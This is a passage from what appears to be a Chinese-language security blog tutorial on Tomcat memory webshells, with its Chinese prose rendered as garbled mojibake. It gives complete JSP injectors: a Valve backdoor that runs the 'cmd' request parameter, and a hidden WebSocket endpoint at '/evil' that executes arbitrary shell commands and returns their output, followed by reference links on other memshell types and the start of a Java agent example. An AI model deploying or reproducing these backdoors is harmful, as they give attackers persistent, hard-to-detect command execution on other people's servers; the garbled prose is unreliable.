class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125; &#125; &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// æ›´ç®€å•çš„æ–¹æ³• è·å–StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">EvilValve</span>());</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-5websocketå†…å­˜é©¬"><a href="#2-5websocketå†…å­˜é©¬" class="headerlink" title="2.5websocketå†…å­˜é©¬"></a>2.5websocketå†…å­˜é©¬</h3><h4 id="2-5-1websocketç®€ä»‹"><a href="#2-5-1websocketç®€ä»‹" class="headerlink" title="2.5.1websocketç®€ä»‹"></a>2.5.1websocketç®€ä»‹</h4><p>å‚è€ƒï¼š<a href="https://stefan.blog.csdn.net/article/details/120025498">https://stefan.blog.csdn.net/article/details/120025498</a></p><p>WebSocketæ˜¯ä¸€ç§å…¨åŒå·¥é€šä¿¡åè®®ï¼Œå³å®¢æˆ·ç«¯å¯ä»¥å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚è¿™æ ·çš„ç‰¹ç‚¹ï¼Œä½¿å¾—å®ƒåœ¨ä¸€äº›å®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„åœºæ™¯æ•ˆæœæ–ç„¶ï¼ˆæ¯”å¦‚å¾®ä¿¡æœ‹å‹åœˆå®æ—¶é€šçŸ¥ã€åœ¨çº¿ååŒç¼–è¾‘ç­‰ï¼‰ã€‚ä¸»æµæµè§ˆå™¨ä»¥åŠä¸€äº›å¸¸è§æœåŠ¡ç«¯é€šä¿¡æ¡†æ¶ï¼ˆTomcatã€nettyã€undertowã€webLogicç­‰ï¼‰éƒ½å¯¹WebSocketè¿›è¡Œäº†æŠ€æœ¯æ”¯æŒã€‚</p><h4 id="2-5-2æœåŠ¡ç«¯å®ç°"><a href="#2-5-2æœåŠ¡ç«¯å®ç°" class="headerlink" title="2.5.2æœåŠ¡ç«¯å®ç°"></a>2.5.2æœåŠ¡ç«¯å®ç°</h4><h5 id="2-5-2-1æ³¨è§£æ–¹å¼å®ç°"><a href="#2-5-2-1æ³¨è§£æ–¹å¼å®ç°" class="headerlink" title="2.5.2.1æ³¨è§£æ–¹å¼å®ç°"></a>2.5.2.1æ³¨è§£æ–¹å¼å®ç°</h5><ul><li>valueï¼šå¿…è¦ï¼ŒStringç±»å‹ï¼Œæ­¤Endpointéƒ¨ç½²çš„URIè·¯å¾„ã€‚</li><li>configuratorï¼šéå¿…è¦ï¼Œç»§æ‰¿ServerEndpointConfig.Configuratorçš„ç±»ï¼Œä¸»è¦æä¾›ServerEndpointå¯¹è±¡çš„åˆ›å»ºæ–¹å¼æ‰©å±•ï¼ˆå¦‚æœä½¿ç”¨Tomcatçš„WebSocketå®ç°ï¼Œé»˜è®¤æ˜¯åå°„åˆ›å»ºServerEndpointå¯¹è±¡ï¼‰ã€‚</li><li>decodersï¼šéå¿…è¦ï¼Œç»§æ‰¿Decoderçš„ç±»ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ä¸€äº›æ¶ˆæ¯è§£ç å™¨ï¼Œæ¯”å¦‚é€šä¿¡çš„æ¶ˆæ¯æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ¥æ”¶åˆ°æ¶ˆæ¯å¯ä»¥è‡ªåŠ¨è§£ç å°è£…æˆæ¶ˆæ¯å¯¹è±¡ã€‚</li><li>encodersï¼šéå¿…è¦ï¼Œç»§æ‰¿Encoderçš„ç±»ï¼Œæ­¤ç«¯ç‚¹å°†ä½¿ç”¨çš„ç¼–ç å™¨ç±»çš„æœ‰åºæ•°ç»„ï¼Œå®šä¹‰è§£ç å™¨å’Œç¼–ç å™¨çš„å¥½å¤„æ˜¯å¯ä»¥è§„èŒƒä½¿ç”¨å±‚æ¶ˆæ¯çš„ä¼ è¾“ã€‚</li><li>subprotocolsï¼šéå¿…è¦ï¼ŒStringæ•°ç»„ç±»å‹ï¼Œç”¨æˆ·åœ¨WebSocketåè®®ä¸‹è‡ªå®šä¹‰æ‰©å±•ä¸€äº›å­åè®®ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/ws/&#123;userId&#125;&quot;, encoders = &#123;MessageEncoder.class&#125;, decoders = &#123;MessageDecoder.class&#125;, configurator = MyServerConfigurator.class)</span></span><br></pre></td></tr></table></figure><p>@ServerEndpointå¯ä»¥æ³¨è§£åˆ°ä»»ä½•ç±»ä¸Šï¼Œä½†æ˜¯æƒ³å®ç°æœåŠ¡ç«¯çš„å®Œæ•´åŠŸèƒ½ï¼Œè¿˜éœ€è¦é…åˆå‡ ä¸ªç”Ÿå‘½å‘¨æœŸçš„æ³¨è§£ä½¿ç”¨ï¼Œè¿™äº›ç”Ÿå‘½å‘¨æœŸæ³¨è§£åªèƒ½æ³¨è§£åœ¨æ–¹æ³•ä¸Šï¼š</p><ul><li>@OnOpen å»ºç«‹è¿æ¥æ—¶è§¦å‘ã€‚</li><li>@OnClose å…³é—­è¿æ¥æ—¶è§¦å‘ã€‚</li><li>@OnError å‘ç”Ÿå¼‚å¸¸æ—¶è§¦å‘ã€‚</li><li>@OnMessage æ¥æ”¶åˆ°æ¶ˆæ¯æ—¶è§¦å‘ã€‚</li></ul><h5 id="2-5-2-2ç»§æ‰¿æŠ½è±¡ç±»"><a href="#2-5-2-2ç»§æ‰¿æŠ½è±¡ç±»" class="headerlink" title="2.5.2.2ç»§æ‰¿æŠ½è±¡ç±»"></a>2.5.2.2ç»§æ‰¿æŠ½è±¡ç±»</h5><p>ç»§æ‰¿æŠ½è±¡ç±»Endpointï¼Œé‡å†™å‡ ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œå®ç°ä¸¤ä¸ªæ¥å£ï¼Œæ¯”åŠ æ³¨è§£ @ServerEndpointæ–¹å¼æ›´éº»çƒ¦ã€‚</p><p>å…¶ä¸­é‡å†™onMessageéœ€è¦å®ç°æ¥å£jakarta.websocket.MessageHandlerï¼Œç»™Endpointåˆ†é…URIè·¯å¾„éœ€è¦å®ç°æ¥å£jakarta.websocket.server.ServerApplicationConfigã€‚</p><p>è€ŒURI pathã€encodersã€decodersã€configuratorç­‰é…ç½®ä¿¡æ¯ç”±jakarta.websocket.server.ServerEndpointConfigç®¡ç†ï¼Œé»˜è®¤å®ç°jakarta.websocket.server.DefaultServerEndpointConfigã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, <span class="string">&quot;/ws/&#123;userId&#125;&quot;</span>).decoders(decoderList).encoders(encoderList).configurator(<span class="keyword">new</span> <span class="title class_">MyServerConfigurator</span>()).build();</span><br></pre></td></tr></table></figure><h4 id="Tomcat-WebSocketçš„åŠ è½½"><a href="#Tomcat-WebSocketçš„åŠ è½½" class="headerlink" title="Tomcat WebSocketçš„åŠ è½½"></a>Tomcat WebSocketçš„åŠ è½½</h4><p>Tomcatæä¾›äº†ä¸€ä¸ªjavax.servlet.ServletContainerInitializerçš„å®ç°ç±»org.apache.tomcat.websocket.server.WsSciã€‚</p><p>ServletContainerInitializerï¼ˆSCIï¼‰ æ˜¯ Servlet 3.0 æ–°å¢çš„ä¸€ä¸ªæ¥å£ï¼Œä¸»è¦ç”¨äºåœ¨å®¹å™¨å¯åŠ¨é˜¶æ®µé€šè¿‡ç¼–ç¨‹é£æ ¼æ³¨å†ŒFilter, Servletä»¥åŠListenerï¼Œä»¥å–ä»£é€šè¿‡web.xmlé…ç½®æ³¨å†Œã€‚è¿™æ ·å°±åˆ©äºå¼€å‘å†…èšçš„webåº”ç”¨æ¡†æ¶.</p><p>å…·ä½“å¯çœ‹ï¼š<a href="https://blog.csdn.net/lqzkcx3/article/details/78507169">Servlet3.0ç ”ç©¶ä¹‹ServletContainerInitializeræ¥å£</a></p><p>å› æ­¤<strong>Tomcatçš„WebSocketåŠ è½½æ˜¯é€šè¿‡SCIæœºåˆ¶å®Œæˆçš„</strong>ã€‚</p><p>WsSciå¯ä»¥å¤„ç†çš„ç±»å‹æœ‰ä¸‰ç§ï¼š</p><ul><li>æ·»åŠ äº†æ³¨è§£@ServerEndpointçš„ç±»</li><li>Endpointçš„å­ç±»</li><li>ServerApplicationConfigçš„å®ç°ç±»</li></ul><p>Tomcatåœ¨Webåº”ç”¨å¯åŠ¨æ—¶ä¼šåœ¨StandardContextçš„startInternalæ–¹æ³•é‡Œé€šè¿‡ WsSci çš„onStartupæ–¹æ³•åˆå§‹åŒ– Listener å’Œ servletï¼Œå†æ‰«æ classpathä¸‹å¸¦æœ‰æ³¨è§£@ServerEndpointçš„ç±»å’ŒEndpointå­ç±»</p><p>å¦‚æœå½“å‰åº”ç”¨å­˜åœ¨ServerApplicationConfigå®ç°ï¼Œåˆ™é€šè¿‡ServerApplicationConfigè·å–Endpointå­ç±»çš„é…ç½®ï¼ˆServerEndpointConfigå®ä¾‹ï¼ŒåŒ…å«äº†è¯·æ±‚è·¯å¾„ç­‰ä¿¡æ¯ï¼‰å’Œç¬¦åˆæ¡ä»¶çš„æ³¨è§£ç±»ï¼Œé€šè¿‡è°ƒç”¨addEndpointå°†ç»“æœæ³¨å†Œåˆ°WebSocketContainerä¸Šï¼›å¦‚æœå½“å‰åº”ç”¨æ²¡æœ‰å®šä¹‰ServerApplicationConfigçš„å®ç°ç±»ï¼Œé‚£ä¹ˆWsScié»˜è®¤åªå°†æ‰€æœ‰æ‰«æåˆ°çš„æ³¨è§£å¼Endpointæ³¨å†Œåˆ°WebSocketContainerã€‚å› æ­¤ï¼Œå¦‚æœé‡‡ç”¨å¯ç¼–ç¨‹æ–¹å¼å®šä¹‰Endpointï¼Œé‚£ä¹ˆå¿…é¡»æ·»åŠ ServerApplicationConfigå®ç°ã€‚</p><p>ç„¶åstartInternalæ–¹æ³•é‡Œä¸ºServletContextæ·»åŠ ä¸€ä¸ªè¿‡æ»¤å™¨org.apache.tomcat.websocket.server.WsFilterï¼Œå®ƒç”¨äºåˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦ä¸ºWebSocketè¯·æ±‚ï¼Œä»¥ä¾¿å®Œæˆæ¡æ‰‹ï¼ˆæ‰€ä»¥ä»»ä½•Tomcatéƒ½å¯ä»¥ç”¨<a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a>çœ‹åˆ°WsFilterï¼‰ã€‚</p><h4 id="Tomcat-WebSocketå†…å­˜é©¬çš„å®ç°"><a href="#Tomcat-WebSocketå†…å­˜é©¬çš„å®ç°" class="headerlink" title="Tomcat WebSocketå†…å­˜é©¬çš„å®ç°"></a>Tomcat WebSocketå†…å­˜é©¬çš„å®ç°</h4><p>æˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹servlet-apiå‹å†…å­˜é©¬çš„å®ç°æ­¥éª¤ï¼Œæ‹¿Filterå‹ä¸¾ä¾‹ï¼š</p><ol><li>è·å–å½“å‰çš„StandardContext</li><li>åˆ›å»ºæ¶æ„Filter</li><li>åˆ›å»ºfilterDefå°è£…Filterå¯¹è±¡ï¼Œè°ƒç”¨StandardContext.addFilterDefæ–¹æ³•å°†filterDefæ·»åŠ åˆ°filterDefs</li><li>åˆ›å»ºfilterMapå°†URLå’Œfilterè¿›è¡Œç»‘å®šï¼Œè°ƒç”¨StandardContext.addFilterMapBeforeæ–¹æ³•å°†filterMapæ·»åŠ åˆ°filterMapsä¸­</li><li>è·å–filterConfigså˜é‡ï¼Œå¹¶å‘å…¶ä¸­æ·»åŠ filterConfigå¯¹è±¡</li></ol><p>æ—¢ç„¶è¦æ’å…¥æ¶æ„Filterï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åœ¨Tomcatå¯åŠ¨è¿‡ç¨‹ä¸­å¯»æ‰¾æ·»åŠ FIlterçš„æ–¹æ³•ï¼Œè€ŒfilterDefã€filterMapã€filterConfigséƒ½æ˜¯StandardContextå¯¹è±¡çš„å±æ€§ï¼Œå¹¶ä¸”ä¹Ÿæœ‰ç›¸åº”çš„addæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆè·å–StandardContextï¼Œå†è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚</p><p>WebSocketå†…å­˜é©¬ä¹Ÿå¾ˆç±»ä¼¼ï¼Œä¸Šä¸€èŠ‚æåˆ°äº†WsSci çš„onStartupæ‰«æ classpathä¸‹å¸¦æœ‰æ³¨è§£@ServerEndpointçš„ç±»å’ŒEndpointå­ç±»ï¼Œå¹¶ä¸”è°ƒç”¨addEndpointæ–¹æ³•æ³¨å†Œåˆ°WebSocketContainerä¸Šã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥ä»WebSocketContainerå‡ºå‘ï¼Œè€ŒWsServerContaineræ˜¯åœ¨StandardContexté‡Œé¢åˆ›å»ºçš„ï¼Œé‚£ä¹ˆï¼Œæ˜¾è€Œæ˜“è§çš„ï¼š</p><ol><li>è·å–å½“å‰çš„StandardContext</li><li>é€šè¿‡StandardContextè·å–ServerContainer</li><li>å®šä¹‰ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªServerEndpointConfigï¼Œç»™è¿™ä¸ªæ¶æ„ç±»åˆ†é…URI path</li><li>è°ƒç”¨ServerContainer.addEndpointæ–¹æ³•ï¼Œå°†åˆ›å»ºçš„ServerEndpointConfigæ·»åŠ è¿›å»</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">config</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(evil.class, <span class="string">&quot;/ws&quot;</span>).build();</span><br><span class="line">container.addEndpoint(config);</span><br></pre></td></tr></table></figure><h4 id="2-5-3å®Œæ•´çš„jspæ³¨å…¥"><a href="#2-5-3å®Œæ•´çš„jspæ³¨å…¥" class="headerlink" title="2.5.3å®Œæ•´çš„jspæ³¨å…¥"></a>2.5.3å®Œæ•´çš„jspæ³¨å…¥</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Process process;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (bool) &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, s&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, s&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">while</span> ((i = inputStream.read()) != -<span class="number">1</span>)</span><br><span class="line">                    stringBuilder.append((<span class="type">char</span>)i);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                process.waitFor();</span><br><span class="line">                session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// String path = request.getParameter(&quot;path&quot;);</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evil&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(C.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getAttribute(path) == <span class="literal">null</span>) &#123;</span><br><span class="line">            container.addEndpoint(configEndpoint);</span><br><span class="line">            servletContext.setAttribute(path, path);</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;success, connect url path: &quot;</span> + servletContext.getContextPath() + path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/11549?time__1311=mqmx0DBD2Gd4lOz30=3G=WwRQDuBhCoD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/11549?time__1311&#x3D;mqmx0DBD2Gd4lOz30%3D3G%3DWwRQDuBhCoD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com.hk%2F</a></p><p><a href="https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://xz.aliyun.com/t/11566?time__1311=mqmx0DBD2QK7uD0vofDyACFwRQKDu7gYD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/11566?time__1311&#x3D;mqmx0DBD2QK7uD0vofDyACFwRQKDu7gYD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com.hk%2F</a></p><p><a href="https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95">https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95</a></p><h3 id="2-6upgradeå†…å­˜é©¬"><a href="#2-6upgradeå†…å­˜é©¬" class="headerlink" title="2.6upgradeå†…å­˜é©¬"></a>2.6upgradeå†…å­˜é©¬</h3><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p><a href="https://www.freebuf.com/vuls/345119.html">https://www.freebuf.com/vuls/345119.html</a></p><h3 id="2-7executorå†…å­˜é©¬"><a href="#2-7executorå†…å­˜é©¬" class="headerlink" title="2.7executorå†…å­˜é©¬"></a>2.7executorå†…å­˜é©¬</h3><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD==BKDsKE4fD9DNqTeoTD">https://xz.aliyun.com/t/11593?time__1311&#x3D;mqmx0DBD2QD%3D%3DBKDsKE4fD9DNqTeoTD</a></p><p><a href="https://www.freebuf.com/vuls/344812.html">https://www.freebuf.com/vuls/344812.html</a></p><p><a href="https://xz.aliyun.com/t/11613">https://xz.aliyun.com/t/11613</a></p><p><a href="https://xz.aliyun.com/t/13639">https://xz.aliyun.com/t/13639</a></p><h2 id="3-agentå†…å­˜é©¬"><a href="#3-agentå†…å­˜é©¬" class="headerlink" title="3.agentå†…å­˜é©¬"></a>3.agentå†…å­˜é©¬</h2><p>å‚è€ƒï¼š<a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Instrumentation-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Instrumentation-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7</a></p><p>æˆ‘ä»¬çŸ¥é“Javaæ˜¯ä¸€ç§é™æ€å¼ºç±»å‹è¯­è¨€ï¼Œåœ¨è¿è¡Œä¹‹å‰å¿…é¡»å°†å…¶ç¼–è¯‘æˆ.classå­—èŠ‚ç ï¼Œç„¶åå†äº¤ç»™JVMå¤„ç†è¿è¡Œã€‚Java Agentå°±æ˜¯ä¸€ç§èƒ½åœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„å‰æä¸‹ï¼Œä¿®æ”¹Javaå­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚</p><p>å®é™…ä¸Šï¼Œå¹³æ—¶è¾ƒä¸ºå¸¸è§çš„æŠ€æœ¯å¦‚çƒ­éƒ¨ç½²ã€ä¸€äº›è¯Šæ–­å·¥å…·ç­‰éƒ½æ˜¯åŸºäºJava AgentæŠ€æœ¯æ¥å®ç°çš„ã€‚é‚£ä¹ˆJava AgentæŠ€æœ¯å…·ä½“æ˜¯æ€æ ·å®ç°çš„å‘¢ï¼Ÿ</p><p>å¯¹äºAgentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨JVMå¯åŠ¨å‰åŠ è½½çš„premain-Agentï¼Œå¦ä¸€ç§æ˜¯JVMå¯åŠ¨ä¹‹ååŠ è½½çš„agentmain-Agentã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067466354-1c0bd6eb-7c4f-4b39-a861-ebd636722a00.jpeg"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067470239-a162a378-4e14-4137-a7d1-90c3a10fae26.jpeg"></p><h3 id="Java-Agentç¤ºä¾‹"><a href="#Java-Agentç¤ºä¾‹" class="headerlink" title="Java Agentç¤ºä¾‹"></a>Java Agentç¤ºä¾‹</h3><h4 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h4><p>æˆ‘ä»¬é¦–å…ˆæ¥å®ç°ä¸€ä¸ªç®€å•çš„premain-Agentï¼Œåˆ›å»ºä¸€ä¸ªMavené¡¹ç›®ï¼Œç¼–å†™ä¸€ä¸ªç®€å•çš„premain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span 